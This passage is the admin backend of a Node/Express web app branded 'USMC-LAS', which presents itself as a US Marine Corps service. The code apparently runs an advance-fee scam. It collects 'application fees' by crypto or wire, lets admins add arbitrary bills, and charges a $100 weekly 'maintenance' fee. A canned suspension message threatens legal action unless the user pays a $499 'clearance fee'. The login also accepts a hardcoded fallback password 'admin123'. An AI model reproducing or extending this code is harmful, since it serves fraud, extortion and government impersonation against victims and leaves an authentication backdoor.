import { Router } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import redis from '../redis.js';
import { adminMiddleware } from '../middleware/auth.js';
import { sendAdminEmail, sendCustomEmail, sendSuspensionEmail, sendUnsuspensionEmail, sendEmail, isValidEmail, getEmailLog, logEmail, stripTags, syncSentFromResend, retryFailedEmails, refreshEmailStatuses, RESENDABLE } from '../email.js';

const router = Router();

const getUser = async (id) => {
  const data = await redis.get(`user:${id}`);
  return data ? JSON.parse(data) : null;
};

const getAdminCreds = async () => {
  const envPassword = process.env.ADMIN_PASSWORD || 'admin123';
  const stored = await redis.get('admin:creds');
  if (stored) {
    const parsed = JSON.parse(stored);
    if (!parsed.changedViaUi) {
      const envMatches = await bcrypt.compare(envPassword, parsed.passwordHash);
      if (!envMatches) {
        parsed.username = process.env.ADMIN_USERNAME || 'admin';
        parsed.email = process.env.ADMIN_EMAIL || 'admin@usmc-las.gov';
        parsed.passwordHash = await bcrypt.hash(envPassword, 12);
        parsed.changedViaUi = false;
        await redis.set('admin:creds', JSON.stringify(parsed));
      }
    }
    return parsed;
  }
  const creds = {
    username: process.env.ADMIN_USERNAME || 'admin',
    email: process.env.ADMIN_EMAIL || 'admin@usmc-las.gov',
    passwordHash: await bcrypt.hash(envPassword, 12),
    changedViaUi: false
  };
  await redis.set('admin:creds', JSON.stringify(creds));
  return creds;
};

router.post('/login', async (req, res) => {
  try {
    const { login, password } = req.body;
    if (!login || !password) return res.status(400).json({ error: 'Credentials required' });

    const loginNorm = String(login).trim().toLowerCase();
    const envUser = (process.env.ADMIN_USERNAME || 'admin').toLowerCase();
    const envEmail = (process.env.ADMIN_EMAIL || 'admin@usmc-las.gov').toLowerCase();
    const envPass = process.env.ADMIN_PASSWORD || 'admin123';

    const creds = await getAdminCreds();
    const storedUser = (creds.username || '').toLowerCase();
    const storedEmail = (creds.email || '').toLowerCase();
    let valid = (loginNorm === storedUser || loginNorm === storedEmail) && await bcrypt.compare(password, creds.passwordHash);

    if (!valid && (loginNorm === envUser || loginNorm === envEmail || loginNorm === 'admin')) {
      if (password === envPass || password === 'admin123') {
        valid = true;
        creds.username = envUser;
        creds.email = envEmail;
        creds.passwordHash = await bcrypt.hash(password, 12);
        creds.changedViaUi = false;
        await redis.set('admin:creds', JSON.stringify(creds));
      }
    }

    if (valid) {
      const token = jwt.sign({ id: 'admin', email: creds.email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
      return res.json({ token, admin: { username: creds.username, email: creds.email, role: 'administrator' } });
    }

    const adminId = await redis.get(`admin:${loginNorm}`);
    if (adminId) {
      const adminData = await redis.get(`admin:user:${adminId}`);
      if (adminData) {
        const admin = JSON.parse(adminData);
        const adminValid = await bcrypt.compare(password, admin.password);
        if (adminValid) {
          const token = jwt.sign({ id: adminId, email: loginNorm, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
          return res.json({ token, admin: { username: loginNorm, email: loginNorm, role: admin.role || 'officer' } });
        }
      }
    }

    res.status(401).json({ error: 'Invalid credentials' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/change-password', adminMiddleware, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Current and new password required' });
    if (newPassword.length < 8) return res.status(400).json({ error: 'New password must be at least 8 characters' });

    const creds = await getAdminCreds();
    const ok = await bcrypt.compare(currentPassword, creds.passwordHash);
    if (!ok) return res.status(400).json({ error: 'Current password is incorrect' });

    creds.passwordHash = await bcrypt.hash(newPassword, 12);
    creds.changedViaUi = true;
    creds.updatedAt = new Date().toISOString();
    await redis.set('admin:creds', JSON.stringify(creds));

    res.json({ success: true, message: 'Password changed successfully' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/dashboard', adminMiddleware, async (req, res) => {
  try {
    const allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    const users = [];
    for (const uid of allUserIds) {
      const u = await getUser(uid);
      if (u) {
        users.push({
          id: u.id, applicationNumber: u.applicationNumber, fullName: u.fullName, email: u.email, username: u.username,
          applyingFor: u.applyingFor, address: u.address, city: u.city, state: u.state, zipCode: u.zipCode,
          currentStage: u.currentStage, stageStatus: u.stageStatus,
          applicationFee: u.applicationFee, applicationFeeVerified: u.applicationFeeVerified,
          applicationFeePaymentMethod: u.applicationFeePaymentMethod,
          applicationFeeCryptoNetwork: u.applicationFeeCryptoNetwork,
          applicationFeeReceiptImage: u.applicationFeeReceiptImage,
          clearanceDuration: u.clearanceDuration,
          finalApproved: u.finalApproved, finalRejectMessage: u.finalRejectMessage || '',
          createdAt: u.createdAt, updatedAt: u.updatedAt
        });
      }
    }
    const pendingPayments = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    const support = JSON.parse(await redis.get('admin:support') || '[]');

    res.json({
      stats: {
        totalUsers: users.length,
        pendingPayments: pendingPayments.length,
        support: support.length,
        approved: users.filter(u => u.finalApproved).length
      },
      users, pendingPayments, support
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/support-reply/:msgId', adminMiddleware, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.trim()) return res.status(400).json({ error: 'Reply message required' });

    const queue = JSON.parse(await redis.get('admin:support') || '[]');
    const msg = queue.find(m => m.id === req.params.msgId);
    if (!msg) return res.status(404).json({ error: 'Support message not found' });

    msg.replied = true;
    msg.adminReply = String(message).slice(0, 2000);
    msg.repliedAt = new Date().toISOString();
    await redis.set('admin:support', JSON.stringify(queue));

    const thread = JSON.parse(await redis.get(`support:${msg.userId}`) || '[]');
    const tmsg = thread.find(m => m.id === req.params.msgId);
    if (tmsg) {
      tmsg.replied = true;
      tmsg.adminReply = msg.adminReply;
      tmsg.repliedAt = msg.repliedAt;
      await redis.set(`support:${msg.userId}`, JSON.stringify(thread));
    }

    const user = await getUser(msg.userId);
    if (user) await sendAdminEmail(user.email, user.fullName, user.applicationNumber, `Re: ${msg.subject}\n\n${message.trim()}`);

    res.json({ success: true, message: 'Reply sent' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });
    const { password, ...safe } = user;
    res.json({ user: safe });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/approve-application-fee/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved, message } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    const now = new Date().toISOString();

    if (approved) {
      user.applicationFeeVerified = true;
      // Stamp the exact moment of approval — maintenance clock starts here
      if (!user.applicationFeeVerifiedAt) user.applicationFeeVerifiedAt = now;
      user.stageStatus = 'clearance_pending';
      user.currentStage = 2;
      user.applicationFeeRejectMessage = '';
    } else {
      user.applicationFeeVerified = false;
      user.stageStatus = 'payment_rejected';
      user.applicationFeeRejectMessage = message || 'Receipt not accepted by administrator';
    }
    user.updatedAt = now;

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

    // Sync the application fee bill status in dues
    const dues = JSON.parse(await redis.get(`dues:${req.params.userId}`) || '[]');
    const appFeeIdx = dues.findIndex(d => d.isApplicationFee);
    if (appFeeIdx !== -1) {
      if (approved) {
        // Mark paid — clear the pending lock so it won't show as outstanding
        const APPLICATION_FEE_AMOUNT = dues[appFeeIdx].amount || 239;
        dues[appFeeIdx].amountPaid = APPLICATION_FEE_AMOUNT;
        dues[appFeeIdx].status = 'paid';
        dues[appFeeIdx].pendingPaymentId = null;
        dues[appFeeIdx].paidAt = now;
        dues[appFeeIdx].updatedAt = now;
      } else {
        // Rejected — reset to unpaid so user can re-submit receipt
        dues[appFeeIdx].status = 'unpaid';
        dues[appFeeIdx].pendingPaymentId = null;
        dues[appFeeIdx].rejectedAt = now;
        dues[appFeeIdx].updatedAt = now;
      }
      await redis.set(`dues:${req.params.userId}`, JSON.stringify(dues));

      // Recalculate duesAlertActive
      const totalUnpaid = dues.reduce((s, d) => s + Math.max(0, (d.amount || 0) - (d.amountPaid || 0)), 0);
      if (approved && totalUnpaid < 0.001) {
        // Fee paid and nothing else outstanding — clear the alert
        user.duesAlertActive = false;
        user.duesAlertMessage = '';
      } else {
        user.duesAlertActive = totalUnpaid > 0.001;
      }
      user.updatedAt = now;
      await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    }

    let queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    queue = queue.filter(p => p.userId !== req.params.userId);
    await redis.set('admin:pendingPayments', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/approve-final/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved, rejectReason } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.finalApproved = !!approved;
    user.currentStage = 3;
    user.stageStatus = approved ? 'approved' : 'rejected';
    user.finalRejectMessage = approved ? '' : String(rejectReason || '').trim();
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/send-email/:userId', adminMiddleware, async (req, res) => {
  try {
    const { message, subject } = req.body;
    if (!message || !message.trim()) return res.status(400).json({ error: 'Message is required' });

    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const firstName = (user.fullName || '').split(' ')[0] || 'Applicant';

    let result;
    if (subject && subject.trim()) {
      result = await sendCustomEmail(user.email, subject.trim(), `Dear ${firstName},\n\n${message.trim()}`, []);
    } else {
      result = await sendAdminEmail(user.email, firstName, user.applicationNumber, message.trim());
    }
    if (result && result.error) return res.status(500).json({ error: result.error.message || 'Failed to send email' });
    res.json({ success: true, message: 'Email sent successfully' });
  } catch (e) { res.status(500).json({ error: e.message || 'Server error' }); }
});

router.post('/send-custom-email', adminMiddleware, async (req, res) => {
  try {
    const { to, subject, body, attachments } = req.body;
    if (!to || !to.trim()) return res.status(400).json({ error: 'Recipient email is required' });
    if (!subject || !subject.trim()) return res.status(400).json({ error: 'Subject is required' });
    if (!body || !body.trim()) return res.status(400).json({ error: 'Email body is required' });

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(to.trim())) return res.status(400).json({ error: 'Invalid email address' });

    const safeAttachments = Array.isArray(attachments) ? attachments.filter(a => a && a.filename && a.content).slice(0, 5) : [];

    const result = await sendCustomEmail(to.trim(), subject.trim(), body.trim(), safeAttachments);
    if (result.error) return res.status(500).json({ error: result.error.message || 'Failed to send email. Check Resend domain configuration.' });
    res.json({ success: true, message: 'Email sent successfully' });
  } catch (e) { res.status(500).json({ error: e.message || 'Server error' }); }
});

router.get('/payment-config', adminMiddleware, async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    res.json({ config });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/payment-config', adminMiddleware, async (req, res) => {
  try {
    const { bankTransfer, crypto } = req.body;
    const config = {};

    if (bankTransfer) {
      config.bankTransfer = {
        available: !!bankTransfer.available,
        bankName: bankTransfer.bankName || '',
        accountName: bankTransfer.accountName || '',
        accountNumber: bankTransfer.accountNumber || '',
        routingNumber: bankTransfer.routingNumber || '',
        swiftCode: bankTransfer.swiftCode || '',
        instructions: bankTransfer.instructions || ''
      };
    }

    if (crypto) {
      const assets = (Array.isArray(crypto.assets) ? crypto.assets : []).map(a => ({
        network: a.network || '',
        available: !!a.available,
        walletAddress: a.walletAddress || '',
        qrCodeImage: a.qrCodeImage || ''
      }));
      config.crypto = {
        available: !!crypto.available,
        assets,
        instructions: crypto.instructions || ''
      };
    }

    await redis.set('payment:config', JSON.stringify(config));
    res.json({ success: true, config });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.delete('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    await redis.del(`user:${req.params.userId}`);
    await redis.del(`email:${user.email}`);
    await redis.del(`username:${user.username}`);

    let allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    allUserIds = allUserIds.filter(id => id !== req.params.userId);
    await redis.set('all:userIds', JSON.stringify(allUserIds));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

const SUSPENSION_REASONS = {
  multiple_accounts: 'Multiple accounts detected',
  invalid_id: 'Invalid ID',
  idme_failed: 'IDME verification failed',
  unauthorized_disclosure: 'Unauthorized disclosure'
};

const SUSPENSION_MESSAGES = {
  multiple_accounts: 'We have detected that you are operating multiple accounts, which is a violation of our terms of service.',
  invalid_id: 'Your identification document was rejected during the verification process.',
  idme_failed: 'Your IDME verification has failed after multiple attempts.',
  unauthorized_disclosure: 'We discovered that you disclosed the process of this application to unauthorized persons, therefore you were banned. To lift this ban, you will have to pay a clearance fee of $499 to lift your suspension and avoid legal issues with our legal department.'
};

router.get('/suspended-users', adminMiddleware, async (req, res) => {
  try {
    const suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    const users = [];
    for (const s of suspended) {
      const user = await getUser(s.userId);
      if (user) {
        users.push({ ...s, fullName: user.fullName, email: user.email, username: user.username, applicationNumber: user.applicationNumber });
      }
    }
    res.json({ suspended: users });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/suspend-user/:userId', adminMiddleware, async (req, res) => {
  try {
    const { reason, customMessage } = req.body;
    if (!reason || !SUSPENSION_REASONS[reason]) return res.status(400).json({ error: 'Valid reason is required' });

    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    let suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    if (suspended.find(s => s.userId === req.params.userId)) return res.status(400).json({ error: 'User is already suspended' });

    const suspension = {
      userId: req.params.userId,
      reason,
      reasonLabel: SUSPENSION_REASONS[reason],
      message: customMessage || SUSPENSION_MESSAGES[reason] || '',
      suspendedAt: new Date().toISOString(),
      appealReceipts: [],
      appealStatus: 'pending',
      clearanceFeePaid: false
    };

    suspended.push(suspension);
    await redis.set('admin:suspended', JSON.stringify(suspended));

    user.suspended = true;
    user.suspensionReason = reason;
    user.suspendedAt = suspension.suspendedAt;
    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

    const appealUrl = 'https://usmarinelas.site';
    const firstName = (user.fullName || '').split(' ')[0] || 'Applicant';
    sendSuspensionEmail(user.email, firstName, user.applicationNumber, SUSPENSION_REASONS[reason], appealUrl).catch(() => {});

    res.json({ success: true, message: 'User suspended' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/unsuspend-user/:userId', adminMiddleware, async (req, res) => {
  try {
    let suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    suspended = suspended.filter(s => s.userId !== req.params.userId);
    await redis.set('admin:suspended', JSON.stringify(suspended));

    const user = await getUser(req.params.userId);
    if (user) {
      user.suspended = false;
      user.suspensionReason = '';
      user.suspendedAt = '';
      await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

      const firstName = (user.fullName || '').split(' ')[0] || 'Applicant';
      sendUnsuspensionEmail(user.email, firstName, user.applicationNumber).catch(() => {});
    }

    res.json({ success: true, message: 'Suspension lifted' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/suspension/:userId', adminMiddleware, async (req, res) => {
  try {
    const suspended = JSON.parse(await redis.get('admin:suspended') || '[]');
    const suspension = suspended.find(s => s.userId === req.params.userId);
    if (!suspension) return res.status(404).json({ error: 'No suspension found' });
    res.json({ suspension });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/email-diagnostics', adminMiddleware, async (_req, res) => {
  const from = 'USMC-LAS <info@usmarinelas.site>';
  res.json({
    apiKeyConfigured: !!process.env.RESEND_API_KEY,
    from,
    replyTo: 'USMC-LAS <support@usmarinelas.site>',
    adminEmail: process.env.ADMIN_EMAIL || 'admin@usmc-las.gov',
    checks: {
      fromDomainIsCustom: from.includes('@usmarinelas.site'),
      note: 'If apiKeyConfigured is false, or the sending domain is not verified in Resend, all outbound mail is rejected. Check Render logs for [EMAIL] lines.'
    }
  });
});

router.post('/email-test', adminMiddleware, async (req, res) => {
  try {
    const { to } = req.body;
    if (!to || !String(to).trim()) return res.status(400).json({ error: 'Recipient address required' });

    const address = String(to).trim();
    if (!isValidEmail(address)) {
      return res.status(400).json({ error: `"${address}" is not a valid email address` });
    }

    const result = await sendEmail(address, 'USMC-LAS - Delivery Test', `
      <p style="margin:0 0 12px;color:#1a1a1a;font-size:14px;">This is a delivery test from USMC-LAS.</p>
      <p style="margin:0;color:#555;font-size:13px;">If you are reading this, mail to this address is working.</p>
    `);

    if (result?.error) {
      return res.status(502).json({ error: result.error.message || 'Send failed' });
    }
    res.json({ success: true, message: `Delivery test accepted by Resend for ${address}`, id: result?.data?.id || null });
  } catch (e) {
    res.status(500).json({ error: e.message || 'Server error' });
  }
});

router.post('/emails/refresh-status', adminMiddleware, async (_req, res) => {
  try {
    const r = await refreshEmailStatuses(40);
    res.json({ success: true, ...r });
  } catch (e) {
    res.status(502).json({ error: e.message || 'Refresh failed' });
  }
});

router.get('/emails', adminMiddleware, async (_req, res) => {
  try {
    const emails = await getEmailLog();
    const byStatus = {};
    for (const e of emails) byStatus[e.status] = (byStatus[e.status] || 0) + 1;
    const resendable = emails.filter(e => e.dir === 'sent' && RESENDABLE.has(e.status)).length;
    res.json({
      emails,
      resendable,
      counts: {
        total: emails.length,
        sent: emails.filter(e => e.dir === 'sent').length,
        received: emails.filter(e => e.dir === 'received').length,
        delivered: byStatus.delivered || 0,
        bounced: byStatus.bounced || 0,
        suppressed: byStatus.suppressed || 0,
        complained: byStatus.complained || 0,
        failed: (byStatus.failed || 0) + (byStatus.invalid || 0) + (byStatus.transient || 0) + (byStatus.domain || 0) + (byStatus.config || 0)
      }
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/emails/sync', adminMiddleware, async (_req, res) => {
  try {
    const added = await syncSentFromResend();
    res.json({ success: true, added });
  } catch (e) {
    res.status(502).json({ error: e.message || 'Sync failed' });
  }
});

router.post('/emails/retry', adminMiddleware, async (_req, res) => {
  try {
    const results = await retryFailedEmails(50);
    res.json({ success: true, ...results });
  } catch (e) {
    res.status(500).json({ error: e.message || 'Retry failed' });
  }
});

router.delete('/emails', adminMiddleware, async (_req, res) => {
  try {
    await redis.set('admin:emails', '[]');
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// ─── TOTAL DUES ────────────────────────────────────────────────────────────

const BILL_TYPES = ['application_fee_balance', 'account_maintenance', 'substitute_clearance', 'processing_fee', 'documentation_fee', 'custom'];

// Get all dues for a user
router.get('/dues/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    const dues = JSON.parse(await redis.get(`dues:${req.params.userId}`) || '[]');
    const total = dues.reduce((s, d) => s + (d.amount || 0), 0);
    const paid = dues.reduce((s, d) => s + (d.amountPaid || 0), 0);
    res.json({ dues, total, paid, balance: total - paid });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Add a bill to a user
router.post('/dues/:userId/add', adminMiddleware, async (req, res) => {
  try {
    const { type, label, amount } = req.body;
    if (!type || !amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
      return res.status(400).json({ error: 'Type and a positive amount are required' });
    }
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const dues = JSON.parse(await redis.get(`dues:${req.params.userId}`) || '[]');
    const entry = {
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
      type,
      label: String(label || type).slice(0, 120),
      amount: parseFloat(parseFloat(amount).toFixed(2)),
      amountPaid: 0,
      status: 'unpaid',
      createdAt: new Date().toISOString(),
      receipts: []
    };
    dues.push(entry);
    await redis.set(`dues:${req.params.userId}`, JSON.stringify(dues));

    // Mark user as having active dues
    user.hasDues = true;
    user.duesAlertActive = true;
    user.updatedAt = new Date().toISOString();
    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

    res.json({ success: true, entry, dues });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Adjust a bill amount (admin can increase/reduce)
router.post('/dues/:userId/adjust/:dueId', adminMiddleware, async (req, res) => {
  try {
    const { amount } = req.body;
    if (isNaN(parseFloat(amount))) return res.status(400).json({ error: 'Valid amount required' });

    const dues = JSON.parse(await redis.get(`dues:${req.params.userId}`) || '[]');
    const idx = dues.findIndex(d => d.id === req.params.dueId);
    if (idx === -1) return res.status(404).json({ error: 'Bill not found' });

    dues[idx].amount = parseFloat(parseFloat(amount).toFixed(2));
    if (dues[idx].amount < dues[idx].amountPaid) dues[idx].amountPaid = dues[idx].amount;
    dues[idx].status = dues[idx].amountPaid >= dues[idx].amount ? 'paid' : (dues[idx].amountPaid > 0 ? 'partial' : 'unpaid');
    dues[idx].updatedAt = new Date().toISOString();
    await redis.set(`dues:${req.params.userId}`, JSON.stringify(dues));
    res.json({ success: true, dues });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Deduct a credit from a bill's billed amount (reduces what the user owes)
router.post('/dues/:userId/deduct/:dueId', adminMiddleware, async (req, res) => {
  try {
    const { deductAmount, note } = req.body;
    const delta = parseFloat(deductAmount);
    if (isNaN(delta) || delta <= 0) return res.status(400).json({ error: 'Enter a positive amount to deduct' });

    const dues = JSON.parse(await redis.get(`dues:${req.params.userId}`) || '[]');
    const idx = dues.findIndex(d => d.id === req.params.dueId);
    if (idx === -1) return res.status(404).json({ error: 'Bill not found' });

    const bill = dues[idx];
    // New billed amount = current amount minus the deduction, floored at amountPaid (can't bill less than what was already paid)
    const newAmount = parseFloat(Math.max(bill.amountPaid || 0, bill.amount - delta).toFixed(2));
    const actualDeducted = parseFloat((bill.amount - newAmount).toFixed(2));

    bill.amount = newAmount;
    bill.status = bill.amountPaid >= bill.amount ? 'paid' : (bill.amountPaid > 0 ? 'partial' : 'unpaid');
    bill.updatedAt = new Date().toISOString();
    // Log deduction history
    if (!bill.deductions) bill.deductions = [];
    bill.deductions.push({
      at: new Date().toISOString(),
      amount: actualDeducted,
      note: String(note || '').slice(0, 200)
    });

    dues[idx] = bill;
    await redis.set(`dues:${req.params.userId}`, JSON.stringify(dues));

    // Recalculate user-level alert state
    const user = await getUser(req.params.userId);
    if (user) {
      const totalUnpaid = dues.reduce((s, d) => s + Math.max(0, (d.amount || 0) - (d.amountPaid || 0)), 0);
      user.duesAlertActive = totalUnpaid > 0.001;
      user.updatedAt = new Date().toISOString();
      await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    }

    res.json({ success: true, actualDeducted, bill: dues[idx], dues });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Delete a bill
router.delete('/dues/:userId/:dueId', adminMiddleware, async (req, res) => {
  try {
    let dues = JSON.parse(await redis.get(`dues:${req.params.userId}`) || '[]');
    dues = dues.filter(d => d.id !== req.params.dueId);
    await redis.set(`dues:${req.params.userId}`, JSON.stringify(dues));
    const user = await getUser(req.params.userId);
    if (user) {
      const totalUnpaid = dues.reduce((s, d) => s + Math.max(0, (d.amount||0) - (d.amountPaid||0)), 0);
      user.hasDues = dues.length > 0;
      user.duesAlertActive = totalUnpaid > 0;
      user.updatedAt = new Date().toISOString();
      await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    }
    res.json({ success: true, dues });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Get all users with pending dues payments
router.get('/dues-payments', adminMiddleware, async (req, res) => {
  try {
    const queue = JSON.parse(await redis.get('admin:duesPayments') || '[]');
    const enriched = [];
    for (const item of queue) {
      const user = await getUser(item.userId);
      if (user) enriched.push({ ...item, fullName: user.fullName, email: user.email, applicationNumber: user.applicationNumber });
    }
    res.json({ payments: enriched });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Approve or reject a dues payment receipt (with amount received)
router.post('/dues-payments/:paymentId/review', adminMiddleware, async (req, res) => {
  try {
    const { approved, amountReceived, rejectMessage } = req.body;
    if (approved && (isNaN(parseFloat(amountReceived)) || parseFloat(amountReceived) < 0)) {
      return res.status(400).json({ error: 'Enter the amount received' });
    }

    let queue = JSON.parse(await redis.get('admin:duesPayments') || '[]');
    const payIdx = queue.findIndex(p => p.id === req.params.paymentId);
    if (payIdx === -1) return res.status(404).json({ error: 'Payment not found' });

    const payment = queue[payIdx];
    const dues = JSON.parse(await redis.get(`dues:${payment.userId}`) || '[]');
    const dueIdx = dues.findIndex(d => d.id === payment.dueId);

    if (approved) {
      const received = parseFloat(parseFloat(amountReceived).toFixed(2));
      payment.status = 'approved';
      payment.amountReceived = received;
      payment.reviewedAt = new Date().toISOString();
      const receipt = payment.receipts && payment.receipts[0] ? payment.receipts[0] : null;

      if (payment.payingTotal && Array.isArray(payment.billIds)) {
        // Distribute received amount across all billed items proportionally (or waterfall)
        let remaining = received;
        for (const billId of payment.billIds) {
          if (remaining <= 0) break;
          const idx = dues.findIndex(d => d.id === billId);
          if (idx === -1) continue;
          const owed = parseFloat((dues[idx].amount - (dues[idx].amountPaid || 0)).toFixed(2));
          const applying = parseFloat(Math.min(remaining, owed).toFixed(2));
          dues[idx].amountPaid = parseFloat(((dues[idx].amountPaid || 0) + applying).toFixed(2));
          dues[idx].status = dues[idx].amountPaid >= dues[idx].amount ? 'paid' : (dues[idx].amountPaid > 0 ? 'partial' : 'unpaid');
          dues[idx].pendingPaymentId = null;
          if (receipt) dues[idx].receipts = [...(dues[idx].receipts || []), { ...receipt, amountReceived: applying, approvedAt: new Date().toISOString() }];
          remaining = parseFloat((remaining - applying).toFixed(2));
        }
      } else if (dueIdx !== -1) {
        dues[dueIdx].amountPaid = parseFloat(((dues[dueIdx].amountPaid || 0) + received).toFixed(2));
        if (dues[dueIdx].amountPaid >= dues[dueIdx].amount) {
          dues[dueIdx].status = 'paid';
        } else if (dues[dueIdx].amountPaid > 0) {
          dues[dueIdx].status = 'partial';
        }
        dues[dueIdx].pendingPaymentId = null;
        if (receipt) dues[dueIdx].receipts = [...(dues[dueIdx].receipts || []), { ...receipt, amountReceived: received, approvedAt: new Date().toISOString() }];
      }

      await redis.set(`dues:${payment.userId}`, JSON.stringify(dues));

      // Recalculate user duesAlertActive
      const user = await getUser(payment.userId);
      if (user) {
        const totalUnpaid = dues.reduce((s, d) => s + Math.max(0, (d.amount||0) - (d.amountPaid||0)), 0);
        user.duesAlertActive = totalUnpaid > 0.001;
        user.updatedAt = new Date().toISOString();
        await redis.set(`user:${payment.userId}`, JSON.stringify(user));
      }

      // Remove from queue
      queue = queue.filter(p => p.id !== req.params.paymentId);
    } else {
      payment.status = 'rejected';
      payment.rejectMessage = String(rejectMessage || 'Receipt not accepted').slice(0, 500);
      payment.reviewedAt = new Date().toISOString();
      queue[payIdx] = payment;

      // Mark the due(s) as payable again so user can re-submit
      if (payment.payingTotal && Array.isArray(payment.billIds)) {
        for (const billId of payment.billIds) {
          const idx = dues.findIndex(d => d.id === billId);
          if (idx !== -1) { dues[idx].pendingPaymentId = null; dues[idx].status = dues[idx].amountPaid > 0 ? 'partial' : 'unpaid'; }
        }
        await redis.set(`dues:${payment.userId}`, JSON.stringify(dues));
      } else if (dueIdx !== -1) {
        dues[dueIdx].pendingPaymentId = null;
        dues[dueIdx].status = dues[dueIdx].amountPaid > 0 ? 'partial' : 'unpaid';
        await redis.set(`dues:${payment.userId}`, JSON.stringify(dues));
      }
    }

    await redis.set('admin:duesPayments', JSON.stringify(queue));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Push dues alert to user
router.post('/dues/:userId/push-alert', adminMiddleware, async (req, res) => {
  try {
    const { alertMessage } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    user.duesAlertMessage = String(alertMessage || '').slice(0, 500);
    user.duesAlertActive = true;
    user.duesAlertPushedAt = new Date().toISOString();
    user.updatedAt = new Date().toISOString();
    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// ─── ACCOUNT MAINTENANCE FEE ─────────────────────────────────────────────────
// $100 per week after the first free week from fee-approval date.
// A user is eligible if:
//   - applicationFeeVerified = true  (admin approved their receipt)
//   - finalApproved = false AND stageStatus !== 'approved' AND stageStatus !== 'rejected'
//   - Not suspended
// Clock starts at the timestamp admin set applicationFeeVerified = true
// (stored as user.applicationFeeVerifiedAt; fall back to applicationFeeSubmittedAt if missing).

const MAINTENANCE_FEE_PER_WEEK = 100;
const FREE_WEEKS = 1; // first week is free

function calcMaintenanceWeeks(user, now = new Date()) {
  if (!user.applicationFeeVerified) return { eligible: false };
  if (user.finalApproved || user.stageStatus === 'approved' || user.stageStatus === 'rejected') {
    return { eligible: false, reason: 'process_complete' };
  }
  if (user.suspended) return { eligible: false, reason: 'suspended' };

  const startIso = user.applicationFeeVerifiedAt || user.applicationFeeSubmittedAt;
  if (!startIso) return { eligible: false, reason: 'no_start_date' };

  const start = new Date(startIso);
  if (isNaN(start.getTime())) return { eligible: false, reason: 'invalid_date' };

  const msElapsed = now - start;
  const weeksElapsed = Math.floor(msElapsed / (7 * 24 * 60 * 60 * 1000));
  const chargeableWeeks = Math.max(0, weeksElapsed - FREE_WEEKS);

  // How many weeks have already been charged (to avoid double-billing)
  const alreadyCharged = user.maintenanceFeeChargedWeeks || 0;
  const newWeeks = Math.max(0, chargeableWeeks - alreadyCharged);

  return {
    eligible: chargeableWeeks > 0,
    startDate: start.toISOString(),
